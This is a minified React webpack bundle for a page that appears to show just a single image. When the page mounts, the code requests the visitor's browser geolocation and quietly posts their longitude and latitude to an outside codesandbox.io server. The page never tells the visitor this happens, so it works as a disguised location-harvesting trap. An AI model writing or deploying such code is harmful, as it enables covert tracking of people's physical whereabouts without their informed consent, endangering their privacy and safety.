(window.webpackJsonp=window.webpackJsonp||[]).push([[0],{14:function(o,t,e){o.exports=e(40)},19:function(o,t,e){},40:function(o,t,e){"use strict";e.r(t);var n=e(1),a=e.n(n),c=e(11),s=e.n(c),r=(e(19),e(12)),i=e(13),l=e.n(i);class d extends a.a.Component{constructor(...o){super(...o),this.componentDidMount=(()=>{console.log("mounted"),navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(o){const t=o.coords.longitude,e=o.coords.latitude;l.a.post("https://922h0.sse.codesandbox.io/location",{location:" new location  long "+t+" lat "+e})})})}render(){return a.a.createElement("div",{className:"App"},a.a.createElement("img",{src:"https://qph.fs.quoracdn.net/main-qimg-8c2b3992e3d041bb85d6effa28af3806"})," ")}}Object(r.geolocated)();const u=document.getElementById("root");s.a.render(a.a.createElement(a.a.StrictMode,null,a.a.createElement(d,null)),u)}},[[14,1,2]]]);
//# sourceMappingURL=main.f60d14c3.chunk.js.map